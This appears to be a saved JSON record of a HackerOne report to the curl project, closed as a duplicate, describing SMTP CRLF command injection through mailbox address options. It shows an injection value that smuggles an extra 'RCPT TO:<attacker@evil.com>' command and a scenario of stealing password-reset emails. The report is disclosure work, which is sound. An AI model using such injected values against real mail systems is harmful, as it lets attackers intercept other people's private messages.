@@ -1,0 +1,195 @@
+{
+  "id": 3414088,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE0MDg4",
+  "url": "https://hackerone.com/reports/3414088",
+  "title": "SMTP CRLF Command Injection in CURLOPT_MAIL_FROM and CURLOPT_MAIL_RCPT",
+  "state": "Closed",
+  "substate": "duplicate",
+  "severity_rating": "medium",
+  "readable_substate": "Duplicate",
+  "created_at": "2025-11-06T12:07:43.950Z",
+  "submitted_at": "2025-11-06T12:07:44.346Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bau1u",
+    "url": "/bau1u",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fn7gkrytf0yy3xthbaoptb6psj85/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-11-10T10:39:03.641Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-11-06T12:31:22.539Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "libcurl's SMTP implementation accepts CR (`\\r`) and LF (`\\n`) bytes in mailbox address inputs without validation. These control characters are inserted directly into SMTP commands, allowing attackers to inject arbitrary SMTP protocol commands. This enables envelope manipulation, adding unauthorized recipients, and potentially bypassing application-level email controls.\n\n### Steps To Reproduce\n\n**Environment:**\n- Target: curl/libcurl source code (https://github.com/curl/curl)\n- Tested versions: \n  - curl 8.17.0 (latest official release) ✅ VULNERABLE\n  - curl 8.12.0-DEV (commit 58023ba52273b05deb36ec1d395df18ba29b3bde) ✅ VULNERABLE\n- Build: Standard release build\n- Date tested: 2025-11-06\n\n**Prerequisites:**\n1. Build curl from source (commit 58023ba52273b05deb36ec1d395df18ba29b3bde)\n2. Download the attached proof-of-concept script: `poc_smtp_crlf_injection.sh`\n\n**Steps:**\n\n1. Make the script executable:\n```bash\nchmod +x poc_smtp_crlf_injection.sh\n```\n\n2. Run the proof-of-concept with the path to your curl binary:\n```bash\n./poc_smtp_crlf_injection.sh /path/to/curl/src/curl\n```\n\nThe script will:\n- Start an SMTP server that logs all received commands\n- Execute curl with a CRLF-injected mailbox address\n- Display clear before/after comparison\n- Highlight the injected commands\n\n3. Observe the output showing the split SMTP commands\n\n**What should happen:** \ncurl should reject the mailbox address containing control characters with an error like \"invalid characters in mailbox address\" or \"control characters not allowed\", similar to how it rejects null bytes in HTTP headers.\n\n**What actually happens:** \ncurl accepts the CRLF characters and sends them as part of the SMTP command, resulting in protocol-level command injection:\n\n```\n> MAIL FROM:<sender@company.com\n> RCPT TO:<attacker@evil.com> SIZE=...    ← INJECTED COMMAND\n> RCPT TO:<victim@company.com>            ← LEGITIMATE RECIPIENT\n```\n\nThe MAIL FROM command is split into two separate lines, with \"RCPT TO:<attacker@evil.com>\" being injected as a separate SMTP command. The email is now sent to both the legitimate recipient AND the attacker's address.\n\n### Evidence\n\n**Attached file demonstrating the vulnerability:**\n\n**poc_smtp_crlf_injection.sh** - Complete, self-contained proof-of-concept script that:\n- Starts a local SMTP server to capture commands\n- Runs curl with CRLF-injected mailbox addresses\n- Displays clear evidence of command injection\n- Requires only Python 3 and bash (no other dependencies)\n- Takes ~30 seconds to run\n- Exit code 1 = vulnerable, 0 = patched\n\n**Sample output from the PoC script:**\n\n```\n══════════════════════════════════════════════════════════════════\nVULNERABILITY CONFIRMED\n══════════════════════════════════════════════════════════════════\n\n✗ VULNERABLE: CRLF injection successful!\n\nSMTP Commands Sent by curl:\n──────────────────────────────────────────────────────────────────\n> EHLO smtp_test_body.txt\n> MAIL FROM:<sender@company.com\n> RCPT TO:<attacker@evil.com> SIZE=59    ← INJECTED!\n> RCPT TO:<victim@company.com>\n> DATA\n\nResult: Email sent to BOTH recipients:\n  ✓ victim@company.com (legitimate)\n  ✓ attacker@evil.com (INJECTED)\n```\n\nThe script output clearly shows:\n1. The MAIL FROM command split into two lines\n2. The injected RCPT TO command on a separate line\n3. Both recipients being accepted by the SMTP server\n4. Confirmation that the email would be sent to both addresses\n\n**Code analysis showing the vulnerability:**\n\nFile: `lib/smtp.c`, lines 838-846\n```c\nresult = Curl_pp_sendf(data, &smtpc->pp,\n                       \"MAIL FROM:%s%s%s%s%s%s\",\n                       from,                 /* Mandatory - NO VALIDATION */\n                       auth ? \" AUTH=\" : \"\",\n                       auth ? auth : \"\",\n                       size ? \" SIZE=\" : \"\",\n                       size ? size : \"\",\n                       utf8 ? \" SMTPUTF8\" : \"\");\n```\n\nFile: `lib/smtp.c`, lines 1875-1921 (`smtp_parse_address`)\n- Function performs basic parsing (strips `<>`, finds `@`)\n- No validation for control characters (CR, LF, NUL)\n- Strings are passed directly to command construction\n\n**Evidence that this is NOT by-design:**\n\ncurl already rejects control characters in similar contexts. From `lib/cookie.c`, lines 436-446:\n\n```c\nstatic bool invalid_octets(const char *ptr) {\n  const unsigned char *p = (const unsigned char *)ptr;\n  /* Reject all bytes \\x01 - \\x1f (*except* \\x09, TAB) + \\x7f */\n  while(*p) {\n    if(((*p != 9) && (*p < 0x20)) || (*p == 0x7f))\n      return TRUE;\n    p++;\n  }\n  return FALSE;\n}\n```\n\nThis function explicitly rejects CR (0x0D) and LF (0x0A) in cookie values. The same validation should apply to SMTP mailbox addresses but is missing.\n\n## Impact\n\nAn attacker who controls email address inputs can inject SMTP commands by adding CRLF characters. This lets them add extra recipients to emails without the application knowing. For example, a password reset email meant for one person gets secretly copied to the attacker's email address.\n\n**Real attack scenario:** A web app sends password reset emails using curl. An attacker registers username `victim\\r\\nRCPT TO:<attacker@evil.com>` on the platform. When the app constructs the email address and passes it to curl, curl injects the extra recipient command. The attacker receives a copy of the password reset link meant for the victim.\n\n**Why this matters:**\n- Many apps build email addresses from usernames + domain without checking for control characters\n- Apps expect the library to handle protocol-level validation (like curl does for cookies and HTTP headers)\n- Attackers can steal sensitive emails: password resets, verification codes, confidential reports\n- The vulnerability affects all apps using `CURLOPT_MAIL_FROM`, `CURLOPT_MAIL_RCPT`, or `CURLOPT_MAIL_AUTH` with any user input",
+  "weakness": {
+    "id": 69,
+    "name": "CRLF Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4973675,
+      "file_name": "poc_smtp_crlf_injection.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eoxkq5ow4l3ypz5qglw4uo9egv2s?response-content-disposition=attachment%3B%20filename%3D%22poc_smtp_crlf_injection.sh%22%3B%20filename%2A%3DUTF-8%27%27poc_smtp_crlf_injection.sh&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCVJSMT4%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042622Z&X-Amz-Expires=802&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIH2Fhv6KDs5AzU%2FgzA8CeQQArN8jMSgzC0pdb81NNni6AiEA1FX2Lca23GhdYKTDTkyKVreIpPrsuf9r%2BjstgEJqLL0qsQUIABADGgwwMTM2MTkyNzQ4NDkiDBAHZ0slG3oyXd062SqOBd6%2BaHJbMUFQjVWi62IuGe6dY4JygzqZyj5tcaZlgLjGTr49jqj2IVdcUQoqA%2Bw%2FEQXvl8ahrg%2FisqdYnIQqc3YhoJd0gdXL1jFD6T43Xnz5%2B21vHd11s%2BooejoTzD6Cq2QAfA0mYZZh38t69d4Z%2FkuAS%2BwKiHFMzML2yZJjjz9A5dC41GlBz%2BP0i3I2OcDk9JgWD9mSQC39DY%2FLQ2aWsBP0Zz6oMc9tpo34IUUm%2BSYMVwIxTzfmYBpM0FzehgXBWLyh3xNbcW%2FEcrg88NfjwhCjTHVTNrhG2fDnBAuVjLd0R8iyxn0DvuXYr4SP2BaIPTZb%2Fq4VJE4%2Fc76PnZIbUtx5%2F1mTKM7hiNaPbz%2FpU5cL8z2Go95FWWfVVaLm7%2FPTQzU7%2FQoPupUgAWGKDpaD6mRXICWy%2BlNmRUJkGEodHjcYag8wTMovU1pCC%2BuboNX4EJmUeXEIxiSznnna8BDXYSRvXhECOT%2F7vUeg6RGnQfPgVL4qat5%2FJ2mchxtCbvT9JvgcELPsfUsYMzh5TQh2MhODZTUe4OycPHh73PyXh97mBL%2FrDQRnvhxKMTLryA%2B2uLnwhqt2T%2BkvuuHUWqDdxvkDIpzFbiVbgxjSoe8NCwBH26ZZYAc7du464%2FJmBEaXQq0nfMkwXLdVrecAblck%2Fco85nU6qDWSK7Y5GnqAIO9CrXeno1r3%2F%2B6UnP68peuvmZx0rMR17i2C%2FCRmKnugeEtOprmF9F1L3AhseFBM7rTrCnAR95zDYXoi1IelmCFdw0y3ITzPP7z%2FTLjb3tRC9tr7D8xKoKMiwhESmlKn42qRDjBxE1JabYA5uQH%2FDo0ivCl0bggT3zSolYymugJGt3uplr%2FMvPnL6olT1IPpxzDrypvSBjqxAWkjieJpyZclllnJjXq67CHX8cyalj%2FpXhTZLa%2BcWffd4tJXIPu%2BypE8dK0Neinz18L6bJCuIkaJ7%2B2Bi0vHAzyTXVUIqlSIMnuQ%2BZwoFPEz9Czq8653Vm3BzhH7zxwuPifOB0aWf5OhV5MkITwTswHSzZkFRcJiXDvjynZGXF6dVTIHS6mZgOdaZhCcRibrc%2FUOXD7hr8op4SBUmqqH1%2FlAlsHx73PgrIehE3T7ZFC2yg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=28a2cd9b9f9302fb506bff4e9f1ca0d20b1556e2b69187aa9210744f24aff1eb",
+      "file_size": 9895,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 11,
+  "voters": [
+    "i0xs3dawi",
+    "0xdeadbull",
+    "sisi0x",
+    "2026",
+    "santoryuhunter",
+    "kamekame",
+    "fhqb",
+    "fahritrh",
+    "alvis42920",
+    "buggingaaron",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3414088",
+  "votes": 11,
+  "latest_disclosable_activity_at": "2025-11-10T10:39:03.491Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:26:22.969083",
+    "source": "https://hackerone.com/reports/3414088.json",
+    "report_id": 3414088
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE0MDg4",
+    "databaseId": "3414088",
+    "title": "SMTP CRLF Command Injection in CURLOPT_MAIL_FROM and CURLOPT_MAIL_RCPT",
+    "url": "https://hackerone.com/reports/3414088",
+    "state": null,
+    "substate": "duplicate",
+    "disclosed_at": "2025-11-10T10:39:03.641Z",
+    "created_at": "2025-11-06T12:07:43.950Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY5",
+      "name": "CRLF Injection",
+      "external_id": "cwe-93"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "bau1u"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM0MTQwODg=",
+    "_id": "3414088",
+    "disclosed": true,
+    "votes": 11,
+    "latest_disclosable_activity_at": "2025-11-10T10:39:03.491Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE0MDg4",
+      "databaseId": "3414088",
+      "title": "SMTP CRLF Command Injection in CURLOPT_MAIL_FROM and CURLOPT_MAIL_RCPT",
+      "url": "https://hackerone.com/reports/3414088",
+      "disclosed_at": "2025-11-10T10:39:03.641Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
